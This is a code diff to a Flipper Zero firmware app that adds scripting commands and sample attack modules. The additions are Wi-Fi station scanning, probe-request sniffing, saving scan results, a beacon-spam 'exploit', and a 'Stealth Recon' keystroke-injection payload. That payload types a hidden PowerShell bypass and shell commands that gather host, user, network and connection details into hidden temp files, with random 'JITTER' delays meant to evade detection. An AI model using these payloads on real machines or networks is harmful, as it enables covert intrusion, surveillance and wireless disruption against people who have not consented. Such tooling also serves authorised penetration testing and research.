@@ -734,6 +734,113 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- LED_COLOR <color> — set LED to a specific color ---- */
+    if(strncmp(line, "LED_COLOR ", 10) == 0) {
+        const char* color = line + 10;
+        if(strcmp(color, "RED") == 0 || strcmp(color, "red") == 0) {
+            notification_message(app->notifications, &sequence_blink_red_100);
+        } else if(strcmp(color, "GREEN") == 0 || strcmp(color, "green") == 0) {
+            notification_message(app->notifications, &sequence_blink_green_100);
+        } else if(strcmp(color, "BLUE") == 0 || strcmp(color, "blue") == 0) {
+            notification_message(app->notifications, &sequence_blink_blue_100);
+        } else if(strcmp(color, "YELLOW") == 0 || strcmp(color, "yellow") == 0) {
+            notification_message(app->notifications, &sequence_blink_yellow_100);
+        } else if(strcmp(color, "CYAN") == 0 || strcmp(color, "cyan") == 0) {
+            notification_message(app->notifications, &sequence_blink_cyan_100);
+        } else if(strcmp(color, "MAGENTA") == 0 || strcmp(color, "magenta") == 0) {
+            notification_message(app->notifications, &sequence_blink_magenta_100);
+        }
+        return;
+    }
+
+    /* ---- JITTER <min_ms> <max_ms> — random delay for anti-detection ---- */
+    if(strncmp(line, "JITTER ", 7) == 0) {
+        const char* rest = line + 7;
+        const char* space = strchr(rest, ' ');
+        if(space) {
+            uint32_t min_ms = (uint32_t)atoi(rest);
+            uint32_t max_ms = (uint32_t)atoi(space + 1);
+            if(max_ms > min_ms) {
+                uint32_t range = max_ms - min_ms;
+                uint32_t rnd = furi_hal_random_get();
+                uint32_t delay = min_ms + (rnd % (range + 1));
+                furi_delay_ms(delay);
+            } else {
+                furi_delay_ms(min_ms);
+            }
+        }
+        return;
+    }
+
+    /* ---- WAIT_BUTTON — pause until user presses OK on Flipper ---- */
+    if(strcmp(line, "WAIT_BUTTON") == 0) {
+        with_view_model(
+            app->execute_view,
+            FPwnExecModel * m,
+            { strncpy(m->status, "[Press OK to continue]", sizeof(m->status) - 1); },
+            true);
+        /* Poll until OK is pressed — we watch for InputTypeShort on InputKeyOk.
+         * Since we can't intercept input here, we blink and wait until the user
+         * clears the abort flag by pressing OK.  Use a simple polling approach. */
+        notification_message(app->notifications, &sequence_blink_yellow_100);
+        /* Wait for the OK button to be pressed.  The execute_input_callback
+         * consumes Back as abort, so we poll the GPIO line for center button. */
+        while(!app->abort_requested) {
+            if(furi_hal_gpio_read(&gpio_button_ok) == false) {
+                /* Button is pressed (active low on Flipper) */
+                furi_delay_ms(100); /* debounce */
+                break;
+            }
+            furi_delay_ms(50);
+        }
+        return;
+    }
+
+    /* ---- SAVE_WIFI — save all WiFi results to SD card from a script ---- */
+    if(strcmp(line, "SAVE_WIFI") == 0) {
+        if(!app->marauder) {
+            FURI_LOG_W(TAG, "SAVE_WIFI: no marauder, skipping");
+            return;
+        }
+        /* Write results to a timestamped file */
+        storage_common_mkdir(app->storage, EXT_PATH("flipperpwn"));
+        storage_common_mkdir(app->storage, EXT_PATH("flipperpwn/wifi"));
+        char save_path[128];
+        snprintf(
+            save_path,
+            sizeof(save_path),
+            EXT_PATH("flipperpwn/wifi/script_%lu.txt"),
+            (unsigned long)furi_get_tick());
+        File* sf = storage_file_alloc(app->storage);
+        if(storage_file_open(sf, save_path, FSAM_WRITE, FSOM_CREATE_NEW)) {
+            char buf[160];
+            uint32_t ac = 0;
+            FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ac);
+            for(uint32_t i = 0; i < ac; i++) {
+                int n = snprintf(
+                    buf,
+                    sizeof(buf),
+                    "%s %s %ddBm CH%u\n",
+                    aps[i].ssid,
+                    aps[i].bssid,
+                    (int)aps[i].rssi,
+                    (unsigned)aps[i].channel);
+                if(n > 0) storage_file_write(sf, buf, (uint16_t)n);
+            }
+            uint32_t hc = 0;
+            FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &hc);
+            for(uint32_t i = 0; i < hc; i++) {
+                if(!hosts[i].alive) continue;
+                int n = snprintf(buf, sizeof(buf), "%s alive\n", hosts[i].ip);
+                if(n > 0) storage_file_write(sf, buf, (uint16_t)n);
+            }
+            storage_file_close(sf);
+            FURI_LOG_I(TAG, "SAVE_WIFI: saved to %s", save_path);
+        }
+        storage_file_free(sf);
+        return;
+    }
+
     /* ---- Modifier combos ---- */
 
     /* CTRL ALT SHIFT <key> — three-modifier combo; check before two-mod variants */
@@ -1082,6 +1189,67 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             return;
         }
         fpwn_marauder_sniff_deauth(app->marauder);
+        return;
+    }
+
+    /* WIFI_SCAN_STA — start station scan and wait for results */
+    if(strcmp(line, "WIFI_SCAN_STA") == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_SCAN_STA: ESP32 not connected, skipping");
+            return;
+        }
+        fpwn_marauder_scan_sta(app->marauder);
+        for(int i = 0; i < 100 && !app->abort_requested; i++) {
+            furi_delay_ms(100);
+            if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
+        }
+        fpwn_marauder_stop(app->marauder);
+        return;
+    }
+
+    /* WIFI_PROBE — sniff probe requests for a duration */
+    if(strncmp(line, "WIFI_PROBE ", 11) == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_PROBE: ESP32 not connected, skipping");
+            return;
+        }
+        uint32_t duration_ms = (uint32_t)atoi(line + 11);
+        if(duration_ms > 120000) duration_ms = 120000; /* cap 2 min */
+        fpwn_marauder_sniff_probe(app->marauder);
+        /* Wait for duration or abort */
+        uint32_t start = furi_get_tick();
+        while(!app->abort_requested && (furi_get_tick() - start) < furi_ms_to_ticks(duration_ms)) {
+            furi_delay_ms(100);
+        }
+        fpwn_marauder_stop(app->marauder);
+        return;
+    }
+    if(strcmp(line, "WIFI_PROBE") == 0) {
+        if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
+            FURI_LOG_W(TAG, "WIFI_PROBE: ESP32 not connected, skipping");
+            return;
+        }
+        fpwn_marauder_sniff_probe(app->marauder);
+        return;
+    }
+
+    /* WIFI_STA_RESULT — type station scan results as keystrokes */
+    if(strcmp(line, "WIFI_STA_RESULT") == 0) {
+        if(!app->marauder) {
+            FURI_LOG_W(TAG, "WIFI_STA_RESULT: no marauder, skipping");
+            return;
+        }
+        uint32_t sta_count = 0;
+        FPwnStation* stas = fpwn_marauder_get_stations(app->marauder, &sta_count);
+        for(uint32_t i = 0; i < sta_count; i++) {
+            char buf[96];
+            snprintf(
+                buf, sizeof(buf), "%s  %ddBm  %s", stas[i].mac, (int)stas[i].rssi, stas[i].ap_ssid);
+            fpwn_type_string(buf);
+            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+            furi_delay_ms(5);
+        }
         return;
     }
 
@@ -1631,6 +1799,55 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
             continue;
         }
         if(strcmp(substituted, "END_IF") == 0) {
+            lines_done++;
+            continue;
+        }
+
+        /* Handle REPEAT_BLOCK <n> / END_REPEAT — loop blocks of commands.
+         * Uses file seek to replay the block without buffering lines. */
+        if(strncmp(substituted, "REPEAT_BLOCK ", 13) == 0) {
+            int reps = atoi(substituted + 13);
+            if(reps < 1) reps = 1;
+            if(reps > 100) reps = 100; /* safety cap */
+            /* Record file position right after REPEAT_BLOCK line */
+            uint32_t block_start = (uint32_t)storage_file_tell(file);
+            for(int rep = 0; rep < reps && !app->abort_requested; rep++) {
+                if(rep > 0) {
+                    storage_file_seek(file, block_start, true);
+                }
+                /* Execute until END_REPEAT */
+                while(!storage_file_eof(file) && !app->abort_requested) {
+                    size_t sn = fpwn_read_line(file, raw, sizeof(raw));
+                    if(sn == 0) break;
+                    char* rt = fpwn_trim(raw);
+                    if(rt[0] == '\0' || rt[0] == '#') continue;
+                    char rsub[FPWN_MAX_LINE_LEN];
+                    fpwn_substitute(rt, rsub, sizeof(rsub), module);
+                    if(strcmp(rsub, "END_REPEAT") == 0) break;
+                    with_view_model(
+                        app->execute_view,
+                        FPwnExecModel * em,
+                        {
+                            size_t cl = strlen(rsub);
+                            if(cl > sizeof(em->status) - 1) cl = sizeof(em->status) - 1;
+                            memcpy(em->status, rsub, cl);
+                            em->status[cl] = '\0';
+                        },
+                        true);
+                    fpwn_exec_command(rsub, app);
+                    if(s_default_delay_ms > 0) furi_delay_ms(s_default_delay_ms);
+                    lines_done++;
+                    with_view_model(
+                        app->execute_view,
+                        FPwnExecModel * em,
+                        { em->lines_done = lines_done; },
+                        true);
+                }
+            }
+            continue;
+        }
+        if(strcmp(substituted, "END_REPEAT") == 0) {
+            /* Standalone END_REPEAT without matching REPEAT_BLOCK — skip */
             lines_done++;
             continue;
         }
@@ -2383,6 +2600,165 @@ static const char SAMPLE_FULL_RECON[] =
     "WIFI_RESULT\n"
     "END_IF\n";
 
+/* Rickroll Beacon — flood the airwaves with famous lyrics as SSIDs */
+static const char SAMPLE_RICKROLL_BEACON[] =
+    "NAME Rickroll Beacon\n"
+    "DESCRIPTION Beacon spam with Rick Astley lyrics as SSIDs (ESP32 required)\n"
+    "CATEGORY exploit\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DURATION 30000 \"Spam duration (ms)\"\n"
+    "PLATFORM WIN\n"
+    "IF_CONNECTED\n"
+    "LED_COLOR GREEN\n"
+    "WIFI_BEACON\n"
+    "WIFI_WAIT {{DURATION}}\n"
+    "WIFI_STOP\n"
+    "LED_COLOR RED\n"
+    "END_IF\n"
+    "PLATFORM MAC\n"
+    "IF_CONNECTED\n"
+    "LED_COLOR GREEN\n"
+    "WIFI_BEACON\n"
+    "WIFI_WAIT {{DURATION}}\n"
+    "WIFI_STOP\n"
+    "LED_COLOR RED\n"
+    "END_IF\n"
+    "PLATFORM LINUX\n"
+    "IF_CONNECTED\n"
+    "LED_COLOR GREEN\n"
+    "WIFI_BEACON\n"
+    "WIFI_WAIT {{DURATION}}\n"
+    "WIFI_STOP\n"
+    "LED_COLOR RED\n"
+    "END_IF\n";
+
+/* Stealth Recon — uses JITTER for anti-detection timing */
+static const char SAMPLE_STEALTH_RECON[] =
+    "NAME Stealth Recon\n"
+    "DESCRIPTION Slow stealthy recon with randomized timing to evade detection\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 3000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "JITTER 500 2000\n"
+    "STRING powershell -nop -ep bypass -w hidden\n"
+    "ENTER\n"
+    "JITTER 1000 3000\n"
+    "LED_COLOR BLUE\n"
+    "STRINGLN $h = hostname; $u = whoami\n"
+    "JITTER 500 1500\n"
+    "STRINGLN $ip = (ipconfig | sls 'IPv4').ToString().Split(':')[1].Trim()\n"
+    "JITTER 500 1500\n"
+    "STRINGLN $arp = arp -a | Out-String\n"
+    "JITTER 500 1500\n"
+    "STRINGLN $conn = netstat -an | sls 'ESTABLISHED' | Select -First 10 | Out-String\n"
+    "JITTER 500 1500\n"
+    "STRINGLN \"HOST:$h USER:$u IP:$ip`n=ARP=`n$arp`n=CONN=`n$conn\" | Out-File $env:TEMP\\r.log\n"
+    "ENTER\n"
+    "LED_COLOR GREEN\n"
+    "JITTER 500 1000\n"
+    "STRING exit\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "JITTER 500 1500\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "JITTER 1000 3000\n"
+    "LED_COLOR BLUE\n"
+    "STRINGLN echo \"HOST:$(hostname) USER:$(whoami)\" > /tmp/.r.log\n"
+    "JITTER 500 1500\n"
+    "STRINGLN ifconfig | grep 'inet ' >> /tmp/.r.log\n"
+    "JITTER 500 1500\n"
+    "STRINGLN arp -a >> /tmp/.r.log\n"
+    "JITTER 500 1500\n"
+    "STRINGLN netstat -an | grep ESTABLISHED | head -10 >> /tmp/.r.log\n"
+    "JITTER 500 1000\n"
+    "LED_COLOR GREEN\n"
+    "STRING exit\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "JITTER 1000 3000\n"
+    "LED_COLOR BLUE\n"
+    "STRINGLN echo \"HOST:$(hostname) USER:$(whoami)\" > /tmp/.r.log\n"
+    "JITTER 500 1500\n"
+    "STRINGLN ip addr | grep 'inet ' >> /tmp/.r.log\n"
+    "JITTER 500 1500\n"
+    "STRINGLN arp -a >> /tmp/.r.log 2>/dev/null\n"
+    "JITTER 500 1500\n"
+    "STRINGLN ss -tunp | head -10 >> /tmp/.r.log\n"
+    "JITTER 500 1000\n"
+    "LED_COLOR GREEN\n"
+    "STRING exit\n"
+    "ENTER\n";
+
+/* Multi-stage WiFi Recon — scan APs, stations, probe requests, then save */
+static const char SAMPLE_WIFI_RECON_FULL[] =
+    "NAME WiFi Recon Full\n"
+    "DESCRIPTION Complete WiFi recon: APs + stations + probes + save\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION PROBE_TIME 15000 \"Probe sniff duration (ms)\"\n"
+    "PLATFORM WIN\n"
+    "IF_CONNECTED\n"
+    "LED_COLOR BLUE\n"
+    "REM Phase 1: Scan APs\n"
+    "WIFI_SCAN\n"
+    "LED_COLOR CYAN\n"
+    "REM Phase 2: Scan stations\n"
+    "WIFI_SCAN_STA\n"
+    "LED_COLOR MAGENTA\n"
+    "REM Phase 3: Sniff probe requests\n"
+    "WIFI_PROBE {{PROBE_TIME}}\n"
+    "LED_COLOR GREEN\n"
+    "REM Phase 4: Save all results to SD\n"
+    "SAVE_WIFI\n"
+    "REM Phase 5: Type results into Notepad\n"
+    "GUI r\n"
+    "DELAY 500\n"
+    "STRING notepad\n"
+    "ENTER\n"
+    "DELAY 1000\n"
+    "STRINGLN === APs ===\n"
+    "WIFI_RESULT\n"
+    "STRINGLN === Stations ===\n"
+    "WIFI_STA_RESULT\n"
+    "END_IF\n"
+    "PLATFORM MAC\n"
+    "IF_CONNECTED\n"
+    "WIFI_SCAN\n"
+    "WIFI_SCAN_STA\n"
+    "WIFI_PROBE {{PROBE_TIME}}\n"
+    "SAVE_WIFI\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING TextEdit\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRINGLN === APs ===\n"
+    "WIFI_RESULT\n"
+    "STRINGLN === Stations ===\n"
+    "WIFI_STA_RESULT\n"
+    "END_IF\n"
+    "PLATFORM LINUX\n"
+    "IF_CONNECTED\n"
+    "WIFI_SCAN\n"
+    "WIFI_SCAN_STA\n"
+    "WIFI_PROBE {{PROBE_TIME}}\n"
+    "SAVE_WIFI\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRINGLN echo '=== APs ==='\n"
+    "WIFI_RESULT\n"
+    "STRINGLN echo '=== Stations ==='\n"
+    "WIFI_STA_RESULT\n"
+    "END_IF\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -2450,4 +2826,13 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/full_recon.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_FULL_RECON);
+
+    snprintf(path, sizeof(path), "%s/rickroll_beacon.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_RICKROLL_BEACON);
+
+    snprintf(path, sizeof(path), "%s/stealth_recon.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_STEALTH_RECON);
+
+    snprintf(path, sizeof(path), "%s/wifi_recon_full.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_WIFI_RECON_FULL);
 }
